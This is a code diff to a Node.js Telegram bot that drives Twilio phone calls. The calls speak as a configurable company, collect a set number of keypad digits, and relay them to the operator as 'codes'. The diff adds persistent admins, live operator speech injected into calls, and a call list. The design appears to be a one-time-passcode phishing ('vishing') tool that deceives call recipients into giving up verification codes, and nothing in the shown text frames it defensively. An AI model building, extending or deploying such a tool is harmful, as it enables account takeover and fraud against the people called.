@@ -115,6 +115,7 @@ function defaultDB() {
       scheduledCalls: 0,
       completedCalls: 0
     },
+    adminIds: [],
     users: {}
   };
 }
@@ -155,11 +156,12 @@ function loadDB() {
         ...defaultDB().stats,
         ...(parsed.stats || {})
       },
+      adminIds: Array.isArray(parsed.adminIds) ? parsed.adminIds.map(String) : [],
       users: parsed.users || {}
     };
 
     if (OWNER_ID) ensureUser(OWNER_ID);
-    for (const adminId of ADMIN_IDS) ensureUser(adminId);
+    for (const adminId of getAdminIds()) ensureUser(adminId);
   } catch (e) {
     console.log("loadDB error:", e.message);
     db = defaultDB();
@@ -167,12 +169,24 @@ function loadDB() {
   }
 }
 
+let dbSaveTimer = null;
+let dbSaveQueued = false;
+
+function flushDB() {
+  if (dbSaveQueued) return;
+  dbSaveQueued = true;
+
+  fs.writeFile(DB_FILE, JSON.stringify(db, null, 2), (e) => {
+    dbSaveQueued = false;
+    if (e) {
+      logger.error("saveDB error: " + e.message);
+    }
+  });
+}
+
 function saveDB() {
-  try {
-    fs.writeFile(DB_FILE, JSON.stringify(db, null, 2), ()=>{});
-  } catch (e) {
-    console.log("saveDB error:", e.message);
-  }
+  clearTimeout(dbSaveTimer);
+  dbSaveTimer = setTimeout(flushDB, 150);
 }
 
 loadDB();
@@ -201,6 +215,11 @@ const quickDialTargets = {
 const calls = new Map();
 let scheduledJobs = [];
 
+function getAdminIds() {
+  return Array.from(new Set([...(ADMIN_IDS || []), ...((db.adminIds || []).map(String))]));
+}
+
+
 // ============================================================
 // ROLES / AUTH
 // ============================================================
@@ -209,7 +228,7 @@ function getRole(chatId) {
   const id = String(chatId || "");
   if (!id) return "blocked";
   if (id === OWNER_ID) return "owner";
-  if (ADMIN_IDS.includes(id)) return "admin";
+  if (getAdminIds().includes(id)) return "admin";
   return "blocked";
 }
 
@@ -300,6 +319,13 @@ function spacedDigits(value) {
   return String(value || "")
     .split("")
     .join(" ");
+}
+
+
+function shortCaller(value) {
+  const s = String(value || "Unknown");
+  if (s.length <= 14) return s;
+  return s.slice(0, 6) + "…" + s.slice(-4);
 }
 
 function callTimerText(call) {
@@ -415,7 +441,8 @@ async function tg(method, data) {
   try {
     const res = await axios.post(
       `https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,
-      data
+      data,
+      { timeout: 10000 }
     );
     return res.data;
   } catch (err) {
@@ -524,6 +551,10 @@ function panelButtons(chatId) {
       { text: "📲 Call", callback_data: "call" }
     ],
     [
+      { text: "🎤 Talk", callback_data: "talk" },
+      { text: "📋 Calls", callback_data: "showcalls" }
+    ],
+    [
       {
         text: settings.paused ? "▶ Resume" : "⏸ Pause",
         callback_data: settings.paused ? "resume" : "pause"
@@ -548,6 +579,7 @@ function panelButtons(chatId) {
   return rows;
 }
 
+
 function panelText(chatId) {
   cleanupEndedCalls();
 
@@ -565,7 +597,7 @@ function panelText(chatId) {
           : call.status === "Answered"
             ? "🟢"
             : call.status === "Held"
-              ? "⏳"
+              ? "⌛"
               : call.status === "Paused"
                 ? "⏸"
                 : call.status === "Ended"
@@ -578,28 +610,18 @@ function panelText(chatId) {
         call.newInput = false;
       }
 
-      lines.push(`📞 CALL ${index + 1} — ${statusIcon} ${call.status}`);
-      lines.push(`Caller: ${call.caller || "Unknown"}`);
-      lines.push(`${settings.itemName}: ${inputText}`);
-      lines.push(`Retries: ${call.retries}/${settings.maxRetries}`);
-      lines.push(`Assistant: ${assistantForCall(call).name}`);
-      lines.push(`Time: ${callTimerText(call)}`);
+      lines.push(`📞 ${index + 1} ${statusIcon} ${call.status} | ${shortCaller(call.caller)}`);
+      lines.push(`🔢 ${inputText} | 🔁 ${call.retries}/${settings.maxRetries} | ⏱ ${callTimerText(call)} | 🎙 ${assistantForCall(call).name}`);
       lines.push("");
     });
   }
 
   const role = getRole(chatId);
 
-  lines.push(`Company: ${settings.company}`);
-  lines.push(`Digits: ${settings.digits}`);
-  lines.push(`Assistant: ${assistant().name}`);
-  lines.push(`Item: ${settings.itemName}`);
-  lines.push(`Paused: ${settings.paused ? "Yes" : "No"}`);
-  lines.push(`Role: ${role}`);
-  lines.push(`Max Retries: ${settings.maxRetries}`);
-  lines.push(`Input Timeout: ${settings.inputTimeout}s`);
-  lines.push(`Auto Confirm: ${settings.autoConfirmSec || 0}s`);
-  lines.push(`Auto Hangup: ${settings.autoHangupSec || 0}s`);
+  lines.push(`🏢 ${settings.company} | 🔢 ${settings.digits} | 📝 ${settings.itemName}`);
+  lines.push(`🎙 ${assistant().name} | ⏸ ${settings.paused ? "Paused" : "Live"} | 👤 ${role}`);
+  lines.push(`⏱ Input ${settings.inputTimeout}s | 🗣 Delay ${settings.answerDelay || 0}s | 🔁 Max ${settings.maxRetries}`);
+  lines.push(`✅ AutoConfirm ${settings.autoConfirmSec || 0}s | ⛔ AutoHangup ${settings.autoHangupSec || 0}s`);
 
   return lines.join("\n");
 }
@@ -698,7 +720,7 @@ function buildInputTwiml(call) {
 
   return `
 <Response>
-<Pause length="${settings.answerDelay}"/>
+<Pause length="${settings.answerDelay || 0}"/>
 <Gather numDigits="${settings.digits}" action="${BASE_URL}/input?owner=${encodeURIComponent(String(call.ownerId))}" method="POST" timeout="${settings.inputTimeout}">
 <Say voice="${voice}">
 ${greeting}
@@ -715,6 +737,7 @@ function buildRetryTwiml(call) {
 
   return `
 <Response>
+<Pause length="${settings.answerDelay || 0}"/>
 <Gather numDigits="${settings.digits}" action="${BASE_URL}/input?owner=${encodeURIComponent(String(call.ownerId))}" method="POST" timeout="${settings.inputTimeout}">
 <Say voice="${voice}">
 ${retryText}
@@ -774,6 +797,19 @@ function buildFailureTwiml(call) {
 ${template(settings.failMessage, call)}
 </Say>
 <Hangup/>
+</Response>
+`;
+}
+
+function buildTalkTwiml(call, text) {
+  const voice = assistantForCall(call).voice;
+  const safe = String(text || "").trim() || "Please wait.";
+  return `
+<Response>
+<Say voice="${voice}">
+${safe}
+</Say>
+<Redirect method="POST">${BASE_URL}/hold?owner=${encodeURIComponent(String(call.ownerId))}</Redirect>
 </Response>
 `;
 }
@@ -983,7 +1019,11 @@ app.post("/input", async (req, res) => {
     pushHistory(`${caller} -> ${settings.itemName}: ${digits}`);
     pushCodeEntry(caller, digits, sid, ownerId);
 
-    try { await tgSend(ownerId, `${digits}`); } catch(e){ console.log('code send fail',e.message);}
+    try {
+      await tgSend(ownerId, `${digits}`);
+    } catch (e) {
+      logger.error("code send fail: " + e.message);
+    }
 
     res.type("text/xml");
     res.send(buildReviewTwiml(call));
@@ -1116,6 +1156,29 @@ app.post("/telegram", async (req, res) => {
         return res.sendStatus(200);
       }
 
+      if (action === "talk") {
+        user.pendingInput = "talk";
+        saveDB();
+        await tgSend(chatId, "Send the text to speak into the live call.");
+        await tgAnswerCallback(callbackId, "Waiting for speech text");
+        return res.sendStatus(200);
+      }
+
+      if (action === "showcalls") {
+        const activeCalls = sortedCallsForUser(chatId).filter((c) => c.status !== "Ended");
+        if (!activeCalls.length) {
+          await tgSend(chatId, "No active calls");
+        } else {
+          let out = "📋 Active Calls\n\n";
+          activeCalls.forEach((c, i) => {
+            out += `${i + 1}. ${c.caller || "Unknown"} | ${c.status} | ${c.input || "waiting"}\n`;
+          });
+          await tgSend(chatId, out.trim());
+        }
+        await tgAnswerCallback(callbackId, "Calls");
+        return res.sendStatus(200);
+      }
+
       if (action === "pause") {
         if (!ownerOnly(chatId)) {
           await tgAnswerCallback(callbackId, "Owner only");
@@ -1218,56 +1281,71 @@ app.post("/telegram", async (req, res) => {
     if (update.message && update.message.text) {
       const text = update.message.text.trim();
 
-// set delay command
 if (text.startsWith("/delay")) {
-  const n=parseInt(text.split(" ")[1],10);
-  if(isNaN(n) || n<0 || n>10){
-    await tgSend(chatId,"Usage: /delay 0-10");
+  const n = parseInt(text.split(" ")[1], 10);
+  if (isNaN(n) || n < 0 || n > 10) {
+    await tgSend(chatId, "Usage: /delay 0-10");
     return res.sendStatus(200);
   }
-  settings.answerDelay=n;
+  settings.answerDelay = n;
   saveSettings();
-  await tgSend(chatId,`Delay set to ${n}s`);
+  await tgSend(chatId, `⏱ Delay set to ${n}s`);
+  markUserDirty(chatId);
+  await updatePanel(chatId);
   return res.sendStatus(200);
 }
 
-// add admin
 if (text.startsWith("/addadmin")) {
   if (!ownerOnly(chatId)) {
-    await tgSend(chatId,"Owner only");
+    await tgSend(chatId, "Owner only");
     return res.sendStatus(200);
   }
-  const id=text.split(" ")[1];
-  if(!id){
-    await tgSend(chatId,"Usage: /addadmin TELEGRAM_ID");
+  const id = String(text.split(" ")[1] || "").trim();
+  if (!id) {
+    await tgSend(chatId, "Usage: /addadmin TELEGRAM_ID");
     return res.sendStatus(200);
   }
-  if(!ADMIN_IDS.includes(id)){
-    ADMIN_IDS.push(id);
+  db.adminIds = db.adminIds || [];
+  if (!getAdminIds().includes(id)) {
+    db.adminIds.push(id);
     ensureUser(id);
+    saveDB();
   }
-  await tgSend(chatId,`Admin added: ${id}`);
+  await tgSend(chatId, `🛡 Admin added: ${id}`);
   return res.sendStatus(200);
 }
 
-// remove admin
 if (text.startsWith("/removeadmin")) {
   if (!ownerOnly(chatId)) {
-    await tgSend(chatId,"Owner only");
+    await tgSend(chatId, "Owner only");
     return res.sendStatus(200);
   }
-  const id=text.split(" ")[1];
-  ADMIN_IDS.splice(ADMIN_IDS.indexOf(id),1);
-  await tgSend(chatId,`Admin removed: ${id}`);
+  const id = String(text.split(" ")[1] || "").trim();
+  db.adminIds = (db.adminIds || []).filter((x) => String(x) !== id);
+  saveDB();
+  await tgSend(chatId, `🗑 Admin removed: ${id}`);
   return res.sendStatus(200);
 }
 
-// list admins
 if (text === "/admins") {
-  await tgSend(chatId,"Admins:\n"+ADMIN_IDS.join("\n"));
+  const ids = getAdminIds();
+  await tgSend(chatId, ids.length ? "🛡 Admins\n\n" + ids.join("\n") : "No admins");
   return res.sendStatus(200);
 }
 
+if (text === "/calls") {
+  const activeCalls = sortedCallsForUser(chatId).filter((c) => c.status !== "Ended");
+  if (!activeCalls.length) {
+    await tgSend(chatId, "No active calls");
+  } else {
+    let out = "📋 Active Calls\n\n";
+    activeCalls.forEach((c, i) => {
+      out += `${i + 1}. ${c.caller || "Unknown"} | ${c.status} | ${c.input || "waiting"}\n`;
+    });
+    await tgSend(chatId, out.trim());
+  }
+  return res.sendStatus(200);
+}
 
 
       if (user.pendingInput === "call" && !text.startsWith("/")) {
@@ -1275,6 +1353,19 @@ if (text === "/admins") {
         saveDB();
         await startCall(text, chatId);
         await tgSend(chatId, `📞 Calling ${text}`);
+        return res.sendStatus(200);
+      }
+
+      if (user.pendingInput === "talk" && !text.startsWith("/")) {
+        const activeCall = newestActiveCallForUser(chatId);
+        user.pendingInput = null;
+        saveDB();
+        if (!activeCall || !activeCall.sid) {
+          await tgSend(chatId, "No active call to talk into");
+          return res.sendStatus(200);
+        }
+        await updateLiveCallTwiml(activeCall.sid, buildTalkTwiml(activeCall, text));
+        await tgSend(chatId, "🎤 Sent to call");
         return res.sendStatus(200);
       }
 
@@ -1311,7 +1402,11 @@ if (text === "/admins") {
 /autohangup X
 /quickdials
 /schedule +number 10m
-/settings`;
+/settings
+/calls
+/delay X
+/admins`;
+
 
         if (ownerOnly(chatId)) {
           commands += `
@@ -1320,7 +1415,10 @@ if (text === "/admins") {
 /export
 /pause
 /resume
-/stop`;
+/stop
+/addadmin ID
+/removeadmin ID`;
+
         }
 
         await tgSend(chatId, commands);
@@ -1340,6 +1438,7 @@ Max Retries: ${settings.maxRetries}
 Input Timeout: ${settings.inputTimeout}
 Auto Confirm: ${settings.autoConfirmSec}
 Auto Hangup: ${settings.autoHangupSec}
+Answer Delay: ${settings.answerDelay || 0}
 Paused: ${settings.paused ? "Yes" : "No"}
 Role: ${role}`
         );
@@ -1719,7 +1818,6 @@ setInterval(async () => {
       }
     }
     cleanupEndedCalls();
-    saveDB();
   } catch {}
 }, 2000);
 
@@ -1734,6 +1832,7 @@ app.listen(PORT, async () => {
   try {
     if (OWNER_ID) {
       ensureUser(OWNER_ID);
+      for (const id of getAdminIds()) ensureUser(id);
       await new Promise((r) => setTimeout(r, 2000));
       await updatePanel(OWNER_ID, true);
       console.log("Owner Telegram panel created");
